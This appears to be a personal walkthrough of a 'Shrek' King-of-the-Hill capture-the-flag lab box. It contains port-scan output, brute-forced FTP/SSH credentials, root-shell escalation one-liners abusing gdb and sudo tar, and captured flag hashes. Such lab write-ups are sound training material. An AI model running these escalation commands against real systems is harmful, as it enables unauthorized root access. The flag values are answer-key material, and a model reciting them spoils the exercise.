

THM-KOTH: Shrek
============================

> labruhtooyboi | December 29, 2020


# 10.10.36.211
# shrek.thm




					# reconnisance



'''
Discovered open port 8080/tcp on 10.10.36.211
Discovered open port 80/tcp on 10.10.36.211
Discovered open port 21/tcp on 10.10.36.211
Discovered open port 22/tcp on 10.10.36.211
Discovered open port 3306/tcp on 10.10.36.211
Discovered open port 65432/tcp on 10.10.36.211
Discovered open port 8009/tcp on 10.10.36.211
Discovered open port 9999/tcp on 10.10.36.211
'''

'''
Nmap scan report for 10.10.36.211
Host is up (0.18s latency).

PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.2
22/tcp    open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 19:cd:2a:1d:a1:fd:2b:82:c2:de:27:00:90:1b:52:a7 (RSA)
|   256 dd:99:85:18:26:9c:3c:7e:87:32:df:2b:43:18:b8:b8 (ECDSA)
|_  256 a2:35:a3:7b:19:af:58:31:fd:6c:40:55:59:4d:7d:52 (ED25519)
80/tcp    open  http    Apache httpd 2.4.6 ((CentOS) PHP/7.1.33)
| http-methods: 
|   Supported Methods: POST OPTIONS GET HEAD TRACE
|_  Potentially risky methods: TRACE
| http-robots.txt: 1 disallowed entry 
|_/Cpxtpt2hWCee9VFa.txt
|_http-server-header: Apache/2.4.6 (CentOS) PHP/7.1.33
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
3306/tcp  open  mysql   MySQL (unauthorized)
8009/tcp  open  ajp13   Apache Jserv (Protocol v1.3)
|_ajp-methods: Failed to get a valid response for the OPTION request
8080/tcp  open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-favicon: Apache Tomcat
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat/7.0.88
9999/tcp  open  abyss?
| fingerprint-strings: 
|   FourOhFourRequest, HTTPOptions: 
|     HTTP/1.0 200 OK
|     Accept-Ranges: bytes
|     Content-Length: 0
|     Content-Type: text/plain; charset=utf-8
|     Last-Modified: Thu, 12 Mar 2020 08:24:13 GMT
|     Date: Wed, 30 Dec 2020 06:19:21 GMT
|   GenericLines, Help, Kerberos, LPDString, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Accept-Ranges: bytes
|     Content-Length: 0
|     Content-Type: text/plain; charset=utf-8
|     Last-Modified: Thu, 12 Mar 2020 08:24:13 GMT
|_    Date: Wed, 30 Dec 2020 06:19:20 GMT
65432/tcp open  unknown
1 service unrecognized despite returning data.
'''




					# enumeration

'''
!-- shrek is like an onion -->
'''

*turns out to be a user
'''
[21][ftp] host: 10.10.36.211   login: shrek   password: 12345678
[22][ssh] host: 10.10.36.211   login: shrek   password: 12345678
'''




					# privelage escalation
					
'''
gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit
'''

'''
/var/www/html/api/config.php
'''

'''
msql>api>users>
(ftp user:ftp )

message.txt
J5rURvCa8DyTg3vR
'''

'''
*while as donkey
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
'''




					# interesting things

>flags
'''
/home/shrek/
0069ba233da89efe6f48e7d214034130
'''

'''
/home/puss/
6f960e8f2ea8e3de92f192fae492ec59
'''

'''
/home/donkey/
974acecd51cc45c843062fdac6235e97
'''

'''
/root/
8cc6ece048e6c42251c411814ff5a22d
'''

'''
mysql>cms>flag
877fe779d235694836c7f5478363974f 
'''

'''
/srv/web/flag.txt
af847d9403e2106a3cb2fd69f33b2d5e
'''

6/8 flags found....


>users
'''
shrek
donkey
puss
'''




>passwds
'''
(i believe these change every new instance, maybe, Im not finished with this box yet)
'''





>files and dirs
'''
/usr/bin/gdb
'''

'''
/var/www/html/api/config.php
/var/www/html/cms/config.php
/var/www/html/cms/lib/classes/class.cms_config.php
'''

'''
/usr/bin/tar
'''




>root stuff 
'''
(if passwords dont change, i will post)
'''

'''
'''
